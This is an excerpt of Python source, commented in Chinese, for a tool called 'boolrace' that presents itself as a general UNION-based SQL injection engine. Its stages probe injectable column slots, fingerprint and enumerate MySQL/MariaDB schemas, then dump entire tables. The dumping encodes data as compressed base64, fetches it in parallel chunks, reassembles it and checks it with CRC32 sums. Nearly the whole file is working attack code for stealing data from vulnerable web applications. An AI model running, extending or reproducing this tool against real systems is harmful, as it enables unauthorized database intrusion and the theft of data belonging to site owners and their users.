    def _agg_sql(self, table, cols, null_bitmap=False):
        """組出「每列用 row_sep 串起來」的聚合表達式。

        關鍵：CONCAT_WS 會靜默跳過 NULL，使整列錯位。
        所以每欄都包 IFNULL，並用 null_marker 保留「這裡本來是 NULL」的資訊。"""
        if self.cfg["extraction"].get("framing") == "length" and not null_bitmap:
            expr = self._agg_sql_framed(table, cols)
            return expr, "(SELECT JSON_ARRAYAGG(%s) FROM `%s`)" % (expr, table)

        sep = self.cfg["extraction"]["row_sep"]
        nullm = self.cfg["extraction"]["null_marker"]
        parts = []
        for c in cols:
            if null_bitmap:
                parts.append(
                    "CASE WHEN `%s` IS NULL THEN 0x%s ELSE `%s` END"
                    % (c, nullm.encode().hex(), c))
            else:
                parts.append(
                    "IFNULL(`%s`,0x%s)" % (c, nullm.encode().hex()))
        return "CONCAT_WS(0x%s,%s)" % (sep.encode().hex(), ",".join(parts)), \
               "(SELECT JSON_ARRAYAGG(%s) FROM `%s`)" % (",".join(parts) and
                    "CONCAT_WS(0x%s,%s)" % (sep.encode().hex(), ",".join(parts)),
                    table)

    def extract_table(self, table, cols):
        mode = self.cfg["extraction"]["mode"]
        validate_mode(mode)
        if mode == "compress":
            return self._extract_compress(table, cols)
        if mode == "slices":
            return self._extract_slices(table, cols)
        if mode == "sliced":
            return self._extract_sliced(table, cols)
        return self._extract_union(table, cols)

    def _extract_slices(self, table, cols):
        """逐列抓取：每次只取一列，用 LIMIT offset,1。
        每列仍須能放進槽位；多次查詢沒有共同快照或穩定列順序。
        回傳與其他模式相同結構。"""
        sep = self.cfg["extraction"]["row_sep"]
        nullm = self.cfg["extraction"]["null_marker"]
        parts = "CONCAT_WS(0x%s,%s)" % (
            sep.encode().hex(),
            ",".join("IFNULL(`%s`,0x%s)" % (c, nullm.encode().hex()) for c in cols))

        total = None
        try:
            v, _, _ = self.query("(SELECT COUNT(*) FROM `%s`)" % table)
            total = int(v)
        except (QueryError, ChannelError, ValueError, TypeError) as e:
            raise SilentFailure("cannot count rows before extraction: %s" % e) from e

        rows, i, reqs = [], 0, 0
        while True:
            if total is not None and i >= total:
                break
            ex = "(SELECT %s FROM `%s` LIMIT %d,1)" % (parts, table, i)
            v, _, _ = self.query(ex)
            if not v or v.upper() == "NULL":
                if total is not None and len(rows) != total:
                    raise SilentFailure("row stream ended before the reported row count")
                break
            vals = v.split(sep)
            if len(vals) != len(cols):
                caps = self.profile.get("slot_capacity") or {}
                cap = max(caps.values()) if caps else None
                raise SilentFailure(
                    "row %d split into %d fields, expected %d. A single row "
                    "is longer than the slot can carry (%s chars) — the page "
                    "is truncating. Shorten the column selection, or use a "
                    "narrower projection (e.g. SUBSTRING the wide TEXT columns)."
                    % (i, len(vals), len(cols),
                       cap if cap is not None else "unknown"))
            rows.append([None if x == nullm else x for x in vals])
            i += 1
            reqs += 1
            time.sleep(self.cfg["extraction"]["throttle"])
        return rows, {"mode": "slices", "reqs": reqs}

    def estimate_size(self, table, cols):
        """先問伺服器這張表聚合後多大，再決定可不可行。
        沒有這一步，工具會先抓一半才發現通道塞不下。"""
        agg, _ = self._agg_sql(table, cols)
        ex = "LENGTH((SELECT IFNULL(JSON_ARRAYAGG(%s),0x5b5d) FROM `%s`))" % (agg, table)
        try:
            v, _, _ = self.query(ex)
            return int(v)
        except Exception:
            return None

    def _agg_len(self, table, cols, offset=None, limit=None):
        """回傳一張表（或其中一段）聚合後的 JSON 長度。"""
        agg, _ = self._agg_sql(table, cols)
        sub = "`%s`" % table
        if limit is not None:
            sub = "(SELECT * FROM `%s` LIMIT %d,%d) t" % (
                table, offset or 0, limit)
        ex = "LENGTH((SELECT IFNULL(JSON_ARRAYAGG(%s),0x5b5d) FROM %s))" % (agg, sub)
        try:
            v, _, _ = self.query(ex)
            return int(v)
        except Exception:
            return None

    def _server_cap(self):
        """問伺服器「單一聚合字串最多能多長」。

        這是全量拉取的真瓶頸：MariaDB 的 JSON_ARRAYAGG / GROUP_CONCAT
        都受 group_concat_max_len 限制（常見 1MB）。超過就靜默截斷，
        產出不合法的 JSON —— JSON_VALID() 會回 0。

        不去問的話，工具會以為表很大、其實是「被切斷的表」。
        """
        if self._server_cap_cache is not None:
            return self._server_cap_cache
        cap = None
        for var in ("group_concat_max_len", "max_allowed_packet"):
            try:
                v, _, _ = self.query("@@%s" % var)
                n = int(v)
                cap = n if cap is None else min(cap, n)
            except Exception:
                continue
        self._server_cap_cache = cap
        return cap

    def _plan_slices(self, table, cols, target=None):
        """把表切成若干段，每段聚合後都遠低於伺服器上限。

        回傳 [(offset, limit), ...]。空表回傳 []。
        切片仍受單列大小、聚合限制與跨查詢資料變動影響。
        """
        total = None
        try:
            v, _, _ = self.query("(SELECT COUNT(*) FROM `%s`)" % table)
            total = int(v)
        except Exception:
            return None
        if total == 0:
            return []

        cap = self._server_cap()
        # 留出安全邊界：JSON 包裝、跳脫都會膨脹，取上限的 1/3
        budget = (cap // 3) if cap else 300000
        if target:
            budget = min(budget, target)

        # 先量 1 列的大小，估算每段能放幾列
        one = self._agg_len(table, cols, 0, 1)
        avg = max(one or 1, 32)
        per = max(1, budget // avg)

        plan, off = [], 0
        while off < total:
            lim = min(per, total - off)
            # 驗證這一段真的沒超限；超了就減半重試
            for _ in range(6):
                got = self._agg_len(table, cols, off, lim)
                if got is None or got < budget:
                    break
                if lim <= 1:
                    raise SilentFailure(
                        "a single row of %r aggregates to %d chars, which "
                        "exceeds the safe budget %d. One row cannot be carried "
                        "in one response; reduce the configured projection. Column mode is unsupported."
                        % (table, got, budget))
                lim = max(1, lim // 2)
            plan.append((off, lim))
            off += lim
        return plan

    def _extract_column(self, table, cols):
        """Legacy research implementation; disabled by extract_table.

        Independent column queries do not establish row identity or a shared
        snapshot. Equal lengths cannot establish correct row pairing.
        """
        setc = self.cfg["extraction"]
        workers = max(1, int(setc.get("workers") or 1))
        throttle = float(setc.get("throttle") or 0.0)

        cap = self._server_cap()
        budget = cap if cap else 1048576

        # 每一欄：SELECT JSON_ARRAYAGG(col) FROM table
        jobs = []       # (col_index, col_name, enc_expr, total_len)
        for ci, c in enumerate(cols):
            agg = ("(SELECT JSON_ARRAYAGG(`%s`) FROM `%s`)" % (c, table))
            size = self._blob_len(agg)
            if size is None:
                raise QueryError("cannot size column %r of %r" % (c, table))
            # JSON 原文比 cap 大就要切片；用 JSON_LENGTH 判斷較穩
            if size >= budget * 0.9:
                raise SilentFailure(
                    "column %r of %r aggregates to %d chars, close to the "
                    "server cap %d. Use extraction.mode='sliced' for this table."
                    % (c, table, size, budget))
            enc = "REPLACE(TO_BASE64(COMPRESS(%s)),0x0a,'')" % agg
            jobs.append((ci, c, enc, size))

        # 把所有欄的所有分段攤平成一個批次，一次送出
        flat, index = [], []
        chunk = self._blob_chunk()
        for job in jobs:
            ci, c, enc, size = job
            # size 是 JSON 長度；壓縮後的 base64 通常更小，但仍以實際為準
            enc_len = self._blob_len(enc)
            if enc_len is None:
                enc_len = size
            pl = self._blob_payloads(enc, enc_len, chunk)
            index.append((ci, len(flat), len(pl), enc_len))
            flat.extend(pl)

        res = (self.tp.get_many(flat, workers=workers, throttle=throttle)
               if flat else [])

        # 逐欄解回，再轉置成列
        nslot = len(self.slots)
        per_col = {}
        for (ci, st, n, enc_len) in index:
            blob = self._blob_join(res[st:st + n], nslot, enc_len)
            body = self._decode_blob(blob, enc_len, table)
            txt, _bin = safe_decode(
                body, table, self.cfg["extraction"].get("on_binary", "hex"))
            try:
                arr = json.loads(txt)
            except json.JSONDecodeError as e:
                raise SilentFailure(
                    "column %r of %r did not decode as JSON: %s"
                    % (cols[ci], table, e.msg))
            per_col[ci] = arr
            if throttle:
                time.sleep(throttle)

        # 轉置：欄陣列 -> 列陣列。長度不一致代表資料不完整，必須報錯。
        lengths = {ci: len(a) for ci, a in per_col.items()}
        uniq = set(lengths.values())
        if len(uniq) > 1:
            raise SilentFailure(
                "columns of %r returned different row counts %r — partial "
                "extraction, refusing to assemble." % (table, lengths))
        nrow = uniq.pop() if uniq else 0

        rows = []
        for ri in range(nrow):
            rows.append([per_col[ci][ri] if ri < len(per_col[ci]) else None
                         for ci in range(len(cols))])

        return rows, {"mode": "column", "cols": len(cols), "rows": nrow,
                      "workers": workers}

    def _extract_sliced(self, table, cols):
        """用 JSON_ARRAYAGG 分段全量拉取：每段壓縮後傳回。

        每段可能需要多個請求；跨查詢不提供快照一致性保證。
        """
        plan = self._plan_slices(table, cols)
        if plan is None:
            raise QueryError("cannot count rows of %r" % table)
        if not plan:
            return [], {"mode": "sliced", "slices": 0, "reqs": 0}

        setc = self.cfg["extraction"]
        agg, _ = self._agg_sql(table, cols)
        # 真正的加速關鍵在這裡：不要把「切片」和「分段」分成兩層平行。
        # 窄通道下每片內含幾百個分段，若外層只開 8 個切片，
        # 實際併發就只有 8。正確做法是把所有切片的請求攤平成一個批次，
        # 一次全部送出去，併發度 = workers。
        #
        # Preserve request order locally; this does not establish SQL row order
        # or a consistent database snapshot across slices.
        nslot = len(self.slots)
        workers = max(1, int(setc.get("workers") or 1))
        throttle = float(setc.get("throttle") or 0.0)
        chunk = self._blob_chunk() if setc.get("mode") != "union" else None

        # --- 第一步：算出每個切片的 base64 總長 -------------------------
        slice_exprs, slice_totals = [], []
        for (off, lim) in plan:
            sub = "(SELECT * FROM `%s` LIMIT %d,%d) t" % (table, off, lim)
            ex = ("REPLACE(TO_BASE64(COMPRESS((SELECT IFNULL(JSON_ARRAYAGG(%s),"
                  "0x5b5d) FROM %s))),0x0a,'')" % (agg, sub))
            slice_exprs.append((off, lim, ex))
            slice_totals.append(self._blob_len(ex))

        # --- 第二步：攤平所有分段 payload -------------------------------
        flat, index = [], []
        for i, (off, lim, ex) in enumerate(slice_exprs):
            tot = slice_totals[i]
            if tot is None:
                index.append(None)
                continue
            pl = self._blob_payloads(ex, tot, chunk)
            index.append((len(flat), len(pl), tot))
            flat.extend(pl)

        # --- 第三步：一次送出（順序由 map 保證）-------------------------
        if any(t is None for t in slice_totals):
            # 有切片問不到總長：退回逐片處理，避免整批失敗
            results = []
            for i, (off, lim, ex) in enumerate(slice_exprs):
                bs, tl = self._fetch_blob(ex)
                results.append((i, bs, tl))
            blobs = {}
            for i, bs, tl in results:
                blobs[i] = bs
        else:
            res = (self.tp.get_many(flat, workers=workers, throttle=throttle)
                   if flat else [])
            blobs = {}
            for i, idx in enumerate(index):
                if idx is None:
                    continue
                st, n, tot = idx
                blobs[i] = self._blob_join(res[st:st + n], nslot, tot)

        all_rows = []
        for i, (off, lim, ex) in enumerate(slice_exprs):
            raw = self._decode_blob(blobs[i], slice_totals[i], table)
            try:
                txt, _bin = safe_decode(
                    raw, table, self.cfg["extraction"].get("on_binary", "hex"))
                arr = json.loads(txt)
            except json.JSONDecodeError as e:
                raise SilentFailure(
                    "slice at offset %d (limit %d) did not decode as JSON: %s. "
                    "The slice is larger than the server can return; retry with "
                    "a smaller extraction.chunk."
                    % (off, lim, e.msg))
            # 交給 _decode_rows 處理：它知道 framing=length 與 null_marker，
            # 分段模式不能自己 split，否則會漏掉長度前綴與 NULL 還原。
            try:
                all_rows.extend(self._decode_rows(txt, cols))
            except SilentFailure as e:
                raise SilentFailure("slice at offset %d: %s" % (off, e))

        return all_rows, {"mode": "sliced", "slices": len(plan),
                          "reqs": len(plan), "workers": workers}

    def _blob_chunk(self):
        """本次可用的段長：受設定與最小槽容量限制，且對齊 4。"""
        setc = self.cfg["extraction"]
        chunk = int(setc["chunk"])
        caps = self.profile.get("slot_capacity") or {}
        if caps:
            safe = min(caps.values())
            if 0 < safe < chunk:
                sys.stderr.write(
                    "[extract] chunk %d > slot capacity %d; using %d\n"
                    % (chunk, safe, safe))
                chunk = safe
        chunk -= chunk % 4
        if chunk < 4:
            raise SilentFailure(
                "slot capacity is too small for one aligned base64 block "
                "(need >= 4 chars). Use extraction.mode='slices' instead.")
        return chunk

    def _blob_len(self, enc_expr):
        try:
            v, _, _ = self.query("LENGTH(%s)" % enc_expr)
            return int(v)
        except Exception:
            return None

    def _blob_payloads(self, enc_expr, total, chunk=None):
        """把一個 blob 的所有分段 payload 算出來（不送出）。"""
        chunk = chunk or self._blob_chunk()
        nslot = len(self.slots)
        if not total:
            return []
        nreq = (total + nslot * chunk - 1) // (nslot * chunk)
        out = []
        for i in range(nreq):
            base = i * nslot * chunk
            exprs = {}
            for k in range(nslot):
                o = base + k * chunk
                if o >= total:
                    exprs[self.slots[k]] = "0x20"
                else:
                    exprs[self.slots[k]] = "SUBSTRING(%s,%d,%d)" % (
                        enc_expr, o + 1, chunk)
            out.append(self.union_sql(exprs))
        return out

    def _blob_join(self, results, nslot, total):
        parts = []
        names = self.slots
        for (status, body, dt) in results:
            text = body.decode("utf-8", "replace")
            for k in range(nslot):
                parts.append(self.sp.extract(names[k], text) or "")
        s = "".join(parts).replace("\n", "").replace("\r", "").strip()[:total]
        if len(s) != total:
            raise SilentFailure(
                "collected %d base64 chars but the server reported %d - "
                "segments did not line up. Refusing to decode a partial stream."
                % (len(s), total))
        return s

    def _fetch_blob(self, enc_expr):
        """把一個大的 base64 字串分多個請求取回，回傳 (blob_str, total_len)。

        三個關鍵設計，都是被真實靶場打出來的：

        1. 段長必須對齊 4。base64 以 4 字元為一組，段長不是 4 的倍數時，
           每段結尾都會被補 padding，拼接後就解不開。

        2. total 只用來「驗證收齊了沒」，不用來偏移。若拿 total 當偏移、
           又在另一套座標系算 SUBSTRING，兩者會錯開。

        3. 先問到 total，就能把所有分段一次算出來、平行送出。
           請求順序由 executor.map 保留，但不同請求仍可能讀到不同資料狀態。
        """
        setc = self.cfg["extraction"]
        chunk = self._blob_chunk()
        total = self._blob_len(enc_expr)
        nslot = len(self.slots)
        workers = max(1, int(setc.get("workers") or 1))
        throttle = float(setc.get("throttle") or 0.0)

        # --- 路徑 A：已知總長 -> 一次算完所有分段，平行送出 -------------
        if total is not None:
            payloads = self._blob_payloads(enc_expr, total, chunk)
            results = self.tp.get_many(payloads, workers=workers,
                                       throttle=throttle)
            return self._blob_join(results, nslot, total), total

        # --- 路徑 B：問不到總長 -> 序列探測到短段為止 -------------------
        sys.stderr.write(
            "[extract] could not read LENGTH(); falling back to sequential "
            "reads (slower, and also disables batching)\n")
        parts, off, reqs = [], 0, 0
        while True:
            exprs = {}
            for k in range(nslot):
                o = off + k * chunk
                exprs[self.slots[k]] = "SUBSTRING(%s,%d,%d)" % (enc_expr, o + 1, chunk)
            payload = self.union_sql(exprs)
            status, body, dt = self.tp.get(payload)
            reqs += 1
            text = body.decode("utf-8", "replace")
            got = [self.sp.extract(self.slots[k], text) or "" for k in range(nslot)]
            parts.extend(got)
            ended = any(len(g) < chunk * 0.9 for g in got)
            off += nslot * chunk
            if ended or reqs > 30000:
                break
            time.sleep(throttle)
        return "".join(parts).replace("\n", "").replace("\r", "").strip(), None

    def _decode_blob(self, blob_str, total, table=""):
        """Decode base64/zlib and compare the advertised uncompressed length."""
        blob = blob_str.encode()
        blob += b"=" * (-len(blob) % 4)
        try:
            raw = base64.b64decode(blob)
        except Exception as e:
            raise SilentFailure(
                "base64 decode failed for %r: %s (len=%d)" % (table, e, len(blob)))
        if len(raw) < 5:
            raise SilentFailure(
                "compressed payload for %r is only %d bytes - the server "
                "likely returned an error page." % (table, len(raw)))
        claimed = struct.unpack("<I", raw[:4])[0]   # MySQL COMPRESS: little-endian
        try:
            body = zlib.decompress(raw[4:])
        except zlib.error as e:
            raise SilentFailure("zlib decompress failed for %r: %s" % (table, e))
        if len(body) != claimed:
            raise SilentFailure(
                "length mismatch for %r: prefix says %d, got %d - truncated stream"
                % (table, claimed, len(body)))
        return body

    def _extract_union(self, table, cols):
        """一次一槽：把整張表塞進一個槽（受單槽回應大小限制）。
        union 模式下，整張表必須一次塞進「一個」槽，所以容量必須
        大於等於整張表的聚合長度，否則必然截斷。先驗算再送。"""
        size = self.estimate_size(table, cols)
        caps = self.profile.get("slot_capacity") or {}
        # union 模式把整張表放進「一個」槽，所以要問：最大的槽夠不夠？
        cap = max(caps.values()) if caps else None
        if size is not None and cap is not None and size > cap:
            raise SilentFailure(
                "table %r aggregates to %d chars but the widest slot only "
                "carries %d. UNION-mode extraction of this table is "
                "impossible on this endpoint (%d× too large). Use "
                "extraction.mode='compress', or extract in slices."
                % (table, size, cap, (size + cap - 1) // cap))
        agg, _ = self._agg_sql(table, cols)
        ex = "(SELECT IFNULL(JSON_ARRAYAGG(%s),0x5b5d) FROM `%s`)" % (agg, table)
        v, _, dt = self.query(ex)
        return self._decode_rows(v, cols), {"mode": "union", "sec": round(dt, 2)}

    def _extract_compress(self, table, cols):
        """整張表一次 COMPRESS+BASE64，分段取回。"""
        agg, _ = self._agg_sql(table, cols)
        sub = "`%s`" % table

        # 先確認不會被伺服器端聚合上限截斷。MariaDB 的 JSON_ARRAYAGG
        # 受 group_concat_max_len 限制，超過就靜默截斷成不合法 JSON。
        size = self._agg_len(table, cols)
        cap = self._server_cap()
        if size is not None and cap is not None and size >= cap:
            raise SilentFailure(
                "JSON_ARRAYAGG of %r is %d chars, but the server caps a single "
                "aggregate at %d (group_concat_max_len). The value is being "
                "truncated into invalid JSON. Use extraction.mode='sliced', "
                "which splits the table into pieces the server can return."
                % (table, size, cap))

        enc = "REPLACE(TO_BASE64(COMPRESS((SELECT IFNULL(JSON_ARRAYAGG(%s),0x5b5d) " \
              "FROM %s))),0x0a,'')" % (agg, sub)
        blob_str, total = self._fetch_blob(enc)
        body = self._decode_blob(blob_str, total, table)
        try:
            txt, _bin = safe_decode(body, table, self.cfg["extraction"].get("on_binary", "hex"))
            rows = self._decode_rows(txt, cols)
        except SilentFailure:
            raise
        except Exception as e:
            raise SilentFailure("decode failed for %r: %s" % (table, e))
        return rows, {"mode": "compress", "wire": len(blob_str),
                      "raw": len(body),
                      "ratio": round(len(body) / max(len(blob_str), 1), 2)}

    def _decode_rows(self, json_text, cols):
        nullm = self.cfg["extraction"]["null_marker"]
        try:
            arr = json.loads(json_text)
        except json.JSONDecodeError as e:
            head = json_text[:80].replace("\n", " ")
            raise SilentFailure(
                "aggregated JSON is not parseable (%s). The response was most "
                "likely truncated by the page or by a response-size cap. "
                "First 80 chars: %r. Reduce extraction.chunk, or the slot "
                "cannot carry this table at all." % (e.msg, head))
        if not isinstance(arr, list) or any(not isinstance(item, str) for item in arr):
            raise SilentFailure("aggregated JSON must be an array of row strings")
        rows, bad = [], 0
        framed = self.cfg["extraction"].get("framing") == "length"
        for item in arr:
            if framed and isinstance(item, str):
                vals = self._unframe_row(item, len(cols),
                                        self.cfg["extraction"]["row_sep"])
                if vals is None:
                    raise SilentFailure(
                        "length-framed row did not parse: %r" % item[:120])
                rows.append([None if v == nullm else v for v in vals])
                continue
            if isinstance(item, str) and item.startswith("base64:type"):
                raw = base64.b64decode(item.split(":", 2)[2])
                try:
                    txt, _bin = safe_decode(
                        raw, "blob", self.cfg["extraction"].get("on_binary", "hex"))
                    vals = txt.split(self.cfg["extraction"]["row_sep"])
                except UnicodeDecodeError:
                    vals = [raw.hex()]
            else:
                vals = item.split(self.cfg["extraction"]["row_sep"])
            if len(vals) != len(cols):
                bad += 1
                if bad == 1:
                    raise SilentFailure(
                        "row width %d != column count %d. A NULL most likely "
                        "shifted the row (CONCAT_WS skips NULLs). First bad row: %r"
                        % (len(vals), len(cols), vals[:5]))
                continue
            rows.append([None if v == nullm else v for v in vals])
        return rows

    # ---------------------------------------------------------- verify
    def verify_table(self, table, cols, rows):
        """比較 CRC32 加總；這是非密碼學檢查，不保證快照、列順序或無碰撞。"""
        if not isinstance(rows, list) or any(not isinstance(r, list) or len(r) != len(cols) for r in rows):
            return {"ok": None, "error": "invalid row shape or column count"}
        sep = self.cfg["extraction"]["row_sep"]
        nullm = self.cfg["extraction"]["null_marker"]
        try:
            bin_cols = self._binary_cols(table, cols)
        except SilentFailure as e:
            return {"ok": None, "error": str(e)}
        parts = [self._col_expr(c, nullm.encode().hex(), c in bin_cols) for c in cols]
        cw = "CONCAT_WS(0x%s,%s)" % (sep.encode().hex(), ",".join(parts))
        ex = "(SELECT SUM(CRC32(%s)) FROM `%s`)" % (cw, table)
        try:
            sv, _, _ = self.query(ex)
        except Exception as e:
            return {"ok": None, "error": str(e)[:80]}
        local = 0
        for r in rows:
            # NULL 必須還原成 null_marker 再算 CRC —— 伺服器端用的是
            # IFNULL(col, null_marker)，若這裡當成空字串，CRC 永遠對不上。
            if any(v is not None and type(v) not in (str, int) for v in r):
                return {"ok": None, "error": "unsupported scalar type; SQL text representation unknown"}
            joined = sep.join(nullm if v is None else str(v) for v in r)
            local = (local + (zlib.crc32(joined.encode()) & 0xFFFFFFFF)) & 0xFFFFFFFFFFFFFFFF
        # MySQL SUM 是 BIGINT，讓 python 整數直接比
        # 空表：SUM(CRC32(...)) 回 NULL，本地也是 0 —— 這算通過。
        if sv in ("", None):
            return {"ok": None, "error": "missing server checksum"}
        if sv == "NULL" and not rows:
            return {"ok": True, "server": "NULL (empty aggregate)", "local": 0,
                    "rows": 0}
        try:
            ok = (int(sv) == local)
        except Exception:
            ok = (sv == str(local))
        return {"ok": ok, "server": sv, "local": local, "rows": len(rows)}


# ============================================================ CLI
def validate_table_name(name):
    # Restrict portable filenames rather than normalizing identifiers silently.
    reserved = {"CON", "PRN", "AUX", "NUL", "_PROBE", "_FINGERPRINT", "_SCHEMA", "_VERIFY"}
    reserved.update("%s%d" % (prefix, i) for prefix in ("COM", "LPT") for i in range(1, 10))
    if (not isinstance(name, str) or not re.fullmatch(r"[A-Za-z0-9_][A-Za-z0-9_-]*", name)
            or name.upper() in reserved):
        raise ValueError("unsafe or unsupported table filename: %r" % name)


def validate_tables(tables):
    if not isinstance(tables, dict):
        raise ValueError("tables must map table names to column lists")
    names = set()
    for name, cols in tables.items():
        validate_table_name(name)
        if name.casefold() in names:
            raise ValueError("duplicate/colliding table filenames: %r" % name)
        names.add(name.casefold())
        if (not isinstance(cols, list) or not cols
                or any(not isinstance(c, str) or not re.fullmatch(r"[A-Za-z0-9_]+", c) for c in cols)
                or len(set(c.casefold() for c in cols)) != len(cols)):
            raise ValueError("unsupported or duplicate column projection for table %r" % name)


def load_cfg(path):
    cfg = json.loads(json.dumps(DEFAULT_CONFIG))
    if path:
        with open(path, encoding="utf-8") as f:
            cfg = deep_merge(cfg, json.load(f))
    validate_mode(cfg["extraction"]["mode"])
    validate_tables(cfg.get("tables", {}))
    return cfg


def main():
    ap = argparse.ArgumentParser(description="boolrace — 通用 UNION 注入通道引擎")
    ap.add_argument("stage", choices=["probe", "fingerprint", "enumerate",
                                      "extract", "verify", "report", "all"])
    ap.add_argument("--config", default="cfg.json")
    ap.add_argument("--table", default=None)
    ap.add_argument("--out", default=None)
    ap.add_argument("--dry-run", action="store_true")
    a = ap.parse_args()

    try:
        cfg = load_cfg(a.config)
        if a.table:
            validate_table_name(a.table)
    except (OSError, ValueError, TypeError, KeyError) as e:
        ap.error("config: %s" % e)
    outdir = a.out or cfg["output"]["dir"]
    if a.stage == "report":
        ap.error("report is unsupported in v0.1.0 experimental; existing stage JSON "
                 "files are not a generated Markdown/JSON report")
    if a.dry_run:
        print(json.dumps({"dry_run": True, "stage": a.stage,
                          "config": a.config, "mode": cfg["extraction"]["mode"],
                          "tables": [a.table] if a.table else list(cfg.get("tables") or {}),
                          "output_dir": outdir,
                          "intent": "configuration/stage intent only; no discovered SQL, "
                                    "no engine, no requests, no output writes"},
                         ensure_ascii=False, indent=2))
        return 0
    os.makedirs(outdir, exist_ok=True)
    eng = Engine(cfg)

    def output_path(name):
        base = os.path.realpath(outdir)
        path = os.path.join(base, name)
        resolved = os.path.realpath(path)
        if os.path.commonpath([base, resolved]) != base or os.path.islink(path):
            raise ValueError("unsafe output path: %r" % name)
        return path

    def save(name, obj):
        with open(output_path(name), "w", encoding="utf-8") as f:
            json.dump(obj, f, ensure_ascii=False, indent=1)

    def stage_probe():
        p = eng.probe()
        print("[probe] ncols=%s slots=%s" % (p["ncols"], p["slots"]))
        save("_probe.json", p)

    def stage_fp():
        if not eng.slots:
            stage_probe()
        f = eng.fingerprint()
        for k, v in f.items():
            print("[fingerprint] %-22s %s" % (k, v))
        save("_fingerprint.json", f)

    def stage_enum():
        if not eng.slots:
            stage_probe()
        dbs = eng.profile.get("databases") or []
        if not dbs:
            eng.fingerprint()
            dbs = eng.profile.get("databases") or []
        configured_schema = cfg["target"].get("schema")
        if configured_schema:
            dbs = [configured_schema]
        result = {}
        for db in dbs:
            if db in ("information_schema", "performance_schema", "mysql", "sys"):
                continue
            tl = eng.list_tables(db)
            result[db] = {}
            for t in tl:
                if t in result[db]:
                    raise ValueError("duplicate table name discovered in schema %r: %r" % (db, t))
                result[db][t] = eng.list_columns(db, t)
                print("[enumerate] %s.%s (%d cols)" % (db, t, len(result[db][t])))
        save("_schema.json", result)
        return result

    def select_tables(schema=None):
        tables = dict(cfg.get("tables") or {})
        selected_schema = cfg["target"].get("schema")
        if not tables:
            if schema is None:
                schema = stage_enum()
            if len(schema) != 1:
                raise ValueError("schema selection is ambiguous; configure target.schema "
                                 "to a single current database")
            selected_schema, discovered = next(iter(schema.items()))
            tables = dict(discovered)
        if selected_schema:
            if not eng.slots:
                stage_probe()
            current, _, _ = eng.query("DATABASE()")
            if current != selected_schema:
                raise ValueError("schema %r is not current database %r; unqualified "
                                 "extraction is unsupported" % (selected_schema, current))
        selected = {t: cols for t, cols in tables.items() if not a.table or t == a.table}
        if not selected:
            raise ValueError("no tables selected; nothing can be extracted or verified")
        validate_tables(selected)
        return selected

    def stage_extract(tables):
        if not eng.slots:
            stage_probe()
        succeeded = {}
        failed = False
        for tname, cols in tables.items():
            print("[extract] %s (%d cols) ..." % (tname, len(cols)), end=" ", flush=True)
            try:
                rows, meta = eng.extract_table(tname, cols)
            except (SilentFailure, QueryError, ChannelError) as e:
                print("FAIL: %s: %s" % (type(e).__name__, e))
                failed = True
                continue
            with open(output_path(tname + ".json"), "w",
                      encoding="utf-8") as f:
                json.dump({"table": tname, "cols": cols, "rows": rows,
                           "meta": meta}, f, ensure_ascii=False)
            print("%d rows %s" % (len(rows), meta))
            succeeded[tname] = cols
        return succeeded, failed

    def stage_verify(tables):
        res = {}
        for tname in tables:
            try:
                p = output_path(tname + ".json")
                with open(p, encoding="utf-8") as f:
                    d = json.load(f)
                if not isinstance(d, dict) or d.get("table") != tname or d.get("cols") != tables[tname]:
                    raise ValueError("extraction file table/projection does not match selection")
                r = eng.verify_table(tname, d["cols"], d["rows"])
            except (OSError, ValueError, KeyError, TypeError, SilentFailure, QueryError, ChannelError) as e:
                r = {"ok": None, "error": str(e)[:160]}
            res[tname] = r
            print("[verify] %-22s %s" % (tname, r))
        save("_verify.json", res)
        return bool(res) and all(r.get("ok") is True for r in res.values())

    status = 0
    try:
        if a.stage == "probe":
            stage_probe()
        elif a.stage == "fingerprint":
            stage_fp()
        elif a.stage == "enumerate":
            stage_enum()
        elif a.stage == "extract":
            _, failed = stage_extract(select_tables())
            status = int(failed)
        elif a.stage == "verify":
            if not eng.slots:
                stage_probe()
            status = int(not stage_verify(select_tables()))
        elif a.stage == "all":
            stage_probe()
            stage_fp()
            schema = stage_enum()
            tables = select_tables(schema)
            extracted, failed = stage_extract(tables)
            verified = stage_verify(extracted)
            status = int(failed or not verified)
    except (SilentFailure, QueryError, ChannelError, OSError, ValueError, TypeError, KeyError) as e:
        print("[error] %s: %s" % (type(e).__name__, e), file=sys.stderr)
        return 1
    finally:
        eng.close()

    st = eng.tp.stats
    print("\n[stats] req=%d bytes=%d 406=%d err=%d"
          % (st["req"], st["bytes"], st["406"], st["err"]))
    return status


if __name__ == "__main__":
    sys.exit(main())